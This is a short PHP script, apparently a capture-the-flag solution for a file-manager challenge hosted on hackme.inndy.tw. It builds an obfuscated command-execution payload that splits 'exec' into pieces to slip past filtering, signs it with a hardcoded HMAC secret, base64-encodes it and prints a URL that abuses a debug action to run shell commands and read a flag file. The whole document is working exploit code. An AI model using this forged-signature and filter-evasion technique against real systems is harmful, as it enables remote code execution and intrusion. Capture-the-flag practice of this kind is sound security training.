<?php
$command = '$a = "ex"; $b = "ec"; $c = $a.$b; echo $c("cd /var/www/webhdisk/flag3/ && ./meow ./flag3");';
$secret_key = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
$hmac = hash_hmac('sha256', $command, $secret_key);
$url='https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&dir[]=1&command='.urlencode(base64_encode($command) . ".".$hmac).'<br/>';
echo $url;
?>